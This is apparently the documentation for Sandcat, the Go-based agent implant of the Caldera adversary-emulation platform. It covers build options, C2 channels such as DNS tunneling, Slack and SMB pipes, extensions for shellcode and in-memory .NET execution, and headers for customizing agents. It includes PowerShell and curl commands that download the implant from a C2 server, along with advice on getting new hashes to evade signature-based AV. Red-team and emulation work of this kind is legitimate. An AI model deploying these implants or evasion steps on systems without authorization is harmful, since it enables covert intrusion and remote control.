# Sandcat Plugin Details

The Sandcat plugin provides Caldera with its default agent implant, Sandcat.
The agent is written in GoLang for cross-platform compatibility and can currently be compiled to run on
Windows, Linux, and MacOS targets.

While the Caldera C2 server requires GoLang to be installed in order to compile agent binaries, 
no installation is required on target machines - the agent program will simply run as an executable.

The `sandcat` plugin does come with precompiled binaries, but these only contain the basic
agent features and are more likely to be flagged by AV as they are publicly available on GitHub.

If you wish to dynamically compile agents to produce new hashes or include additional agent features,
the C2 server must have GoLang installed.

## Source Code
The source code for the sandcat agent is located in the `gocat` and `gocat-extensions` directories.
`gocat` contains the core agent code, which provides all of the basic features.
`gocat-extensions` contains source code for extensions that can be compiled into new agent binaries on demand.
The extensions are kept separate to keep the agent lightweight and to allow more flexibility when catering to
various use cases.

## Precompiled Binaries
Precompiled agent binaries are located in the `payloads` directory and are referenced with the following filename:
- `sandcat.go-darwin` compiled binary for Mac targets
- `sandcat.go-darwin-arm64` compiled binary for Mac with ARM processor targets
- `sandcat.go-linux` compiled binary for Linux targets
- `sandcat.go-windows` compiled binary for Windows targets

These files get updated when dynamically compiling agents, so they will always contain the
latest compiled version on your system.

## Deploy

To deploy Sandcat, use one of the built-in delivery commands from the main server GUI which allows you to run the agent 
on Windows, Mac, or Linux.

Each of these commands downloads a compiled Sandcat executable from Caldera and runs it immediately.

Once the agent is running, it should show log messages when it beacons into Caldera.

> If you have GoLang installed on the Caldera server, each time you run one of the delivery commands above, 
the agent will re-compile itself dynamically to obtain a new file hash. This will help bypass file-based signature detections.

### Options

When running the Sandcat agent binary, there are optional parameters you can use when you start the executable:

* `-H "architecture: [architecture]"`: For MacOS, both amd64 and arm64 are supported. When retrieving the executable from the server, the architecture header can be used to select the correct executable: `-H "architecture:amd64"` or `-H "architecture:arm64"`.
* `-server [C2 endpoint]`: This is the location (e.g. HTTP URL, IPv4:port string) that the agent will use to reach the C2 server. (e.g. `-server http://10.0.0.1:8888`, `-server 10.0.0.1:53`, `-server https://example.com`). The agent must have connectivity to this endpoint. 
* `-group [group name]`: This is the group name that you would like the agent to join when it starts. The group does not have to exist beforehand. A default group of `red` will be used if this option is not provided (e.g. `-group red`, `-group mygroup`)
* `-v`: Toggle verbose output from sandcat. If this flag is not set, sandcat will run silently. This only applies to output that would be displayed on the target machine, for instance if running sandcat from a terminal window. This option does not affect the information that gets sent to the C2 server.
* `-httpProxyGateway [gateway]`: Sets the HTTP proxy gateway if running Sandcat in environments that use proxies to reach the internet
* `-paw [identifier]`: Optionally assign the agent with an identifier value. By default, the agent will be assigned a random identifier by the C2 server.
* `-c2 [C2 method name]`: Instruct the agent to connect to the C2 server using the given C2 communication method. By default, the agent will use HTTP(S). The following C2 channels are currently supported:
    - HTTP(S) (`-c2 HTTP`, or simply exclude the `c2` option)
    - DNS Tunneling (`-c2 DnsTunneling`): requires the agent to be compiled with the DNS tunneling extension.
    - FTP (`-c2 FTP`): requires the agent to be compiled with the FTP extension
    - Github GIST (`-c2 GIST`): requires the agent to be compiled with the Github Gist extension
    - Slack (`-c2 Slack`): requires the agent to be compiled with the Slack extension
    - SMB Pipes (`-c2 SmbPipe`): allows the agent to connect to another agent peer via SMB pipes to route traffic through an agent proxy to the C2 server. Cannot be used to connect directly to the C2. Requires the agent to be compiled with the `proxy_smb_pipe` SMB pipe extension.
* `-delay [number of seconds]`: pause the agent for the specified number of seconds before running
* `-listenP2P`: Toggle peer-to-peer listening mode. When enabled, the agent will listen for and accept peer-to-peer connections from other agents. This feature can be leveraged in environments where users want agents within an internal network to proxy through another agent in order to connect to the C2 server.
* `-originLinkID [link ID]`: associated the agent with the operation instruction with the given link ID. This allows the C2 server to map out lateral movement by determining which operation instructions spawned which agents.

Additionally, the sandcat agent can tunnel its communications to the C2 using the following options (for more details, see the [C2 tunneling documentation](../../C2-Tunneling.md)

## Extensions
In order to keep the agent code lightweight, the default Sandcat agent binary ships with limited basic functionality.
Users can dynamically compile additional features, referred to as "gocat extensions".
Each extension is temporarily added to the existing core sandcat code to provide functionality such as peer-to-peer proxy implementations, additional
executors, and additional C2 communication protocols. 

To request particular extensions, users must include the `gocat-extensions` HTTP header when asking the C2 to compile an agent. 
The header value must be a comma-separated list of requested extensions.
The server will include the extensions in the binary if they exist and if their dependencies are met (i.e. if the extension requires a particular
GoLang module that is not installed on the server, then the extension will not be included).

Below is an example PowerShell snippet to request the C2 server to include the `proxy_http` and `shells` 
extensions:
```
$url="http://192.168.137.1:8888/file/download"; # change server IP/port as needed
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows"); # specifying Windows build
$wc.Headers.add("file","sandcat.go"); # requesting sandcat binary
$wc.Headers.add("gocat-extensions","proxy_http,shells"); # requesting the extensions
$output="C:\Users\Public\sandcat.exe"; # specify destination filename
$wc.DownloadFile($url,$output); # download
```

The following features are included in the stock default agent:
- `HTTP` C2 contact protocol for HTTP(S)
- `psh` PowerShell executor (Windows)
- `cmd` cmd.exe executor (Windows)
- `sh` shell executor (Linux/Mac)
- `proc` executor to directly spawn processes from executables without needing to invoke a shell (Windows/Linux/Mac)
- SSH tunneling to tunnel traffic to the C2 server.

Additional functionality can be found in the following agent extensions:

**C2 Communication Extensions**
- `gist`: provides the Github Gist C2 contact protocol. Requires the following GoLang modules:
    - `github.com/google/go-github/github`
    - `golang.org/x/oauth2`
- `dns_tunneling`: provides the DNS tunneling C2 communication protocol. Requires the following GoLang modules:
    - `github.com/miekg/dns`
- `ftp`: provides the FTP C2 communication protocol. Requires the following GoLang modules:
    - `github.com/jlaffaye/ftp`
- `slack`: provides the Slack C2 communication protocol.
- `proxy_http`: allows the agent to accept peer-to-peer messages via HTTP. Not required if the agent is simply using HTTP to connect to a peer (acts the same as connecting direclty to the C2 server over HTTP).
- `proxy_smb_pipe`: provides the `SmbPipe` peer-to-peer proxy client and receiver for Windows (peer-to-peer communication via SMB named pipes).
    - Requires the `gopkg.in/natefinch/npipe.v2` GoLang module

**Executor Extensions**
- `shells`: provides the `osascript` (Mac Osascript), `pwsh` (Windows powershell core), and Python (`python2` and `python3`) executors.
- `shellcode`: provides the shellcode executors.
- `native`: provides basic native execution functionality, which leverages GoLang code to perform tasks rather than calling external binaries or commands.
- `native_aws`: provides native execution functionality specific to AWS. Does not require the `native` extension, but does require the following GoLang modules:
    - `github.com/aws/aws-sdk-go`
    - `github.com/aws/aws-sdk-go/aws`
- `donut`: provides the Donut functionality to execute certain .NET executables in memory. See https://github.com/TheWover/donut for additional information.

**Other Extensions**
- `shared` extension provides the C sharing functionality for Sandcat. This can be used to compile Sandcat as a DLL rather than a `.exe` for Windows targets.

## Exit Codes

Exit codes returned from Sandcat vary across executors. Typical shell executors will return the exit code provided by the shell. Certain executor extensions will return values hard-coded in Sandcat.

Sandcat includes general exit codes which may be utilized by executors, overriden by executors, or used in error cases. The following values describe general Sandcat exit codes:
- `-1`: Error (e.g., cannot decode command, payload not available)
- `0`: Success

The following values describe exit codes utilized by specific executors:
- `shells`: Returns the exit code provided by the OS/shell.
- `shellcode`: Utilizes the general Sandcat exit codes.
- `native` and `native_aws`:
    - `0`: Success
    - `1`: Process error (e.g., error while executing code)
    - `2`: Input error (e.g., invalid parameters)
- `donut`: Returns the exit code provided by the OS/shell.

## Customizing Default Options & Execution Without CLI Options

It is possible to customize the default values of these options when pulling Sandcat from the Caldera server.  
This is useful if you want to hide the parameters from the process tree or if you cannot specify arguments when executing the agent binary. 

You can do this by passing the values in as headers when requesting the agent binary from the C2 server instead of as parameters when executing the binary.

The following parameters can be specified this way:
- `server`
- `group`
- `listenP2P`

For example, the following will download a linux executable that will use `http://10.0.0.2:8888` as the server address
instead of `http://localhost:8888`, will set the group name to `mygroup` instead of the default `red`, and will enable the P2P listener:

```
curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' -H 'server:http://10.0.0.2:8888' -H 'group:mygroup' -H 'listenP2P:true' http://localhost:8888/file/download > sandcat
```

Additionally, if you want the C2 server to compile the agent with a built-in list of known peers (agents that are actively listening for peer-to-peer requests), you can do so with the following header:
- `includeProxyPeers` 
Example usage:
- `includeProxyPeers:all` - include all peers, regardless of what proxy methods they are listening on
- `includeProxypeers:SmbPipe` - only include peers listening for SMB pipe proxy traffic
- `includeProxypeers:HTTP` - only include peers listening for HTTP proxy traffic.
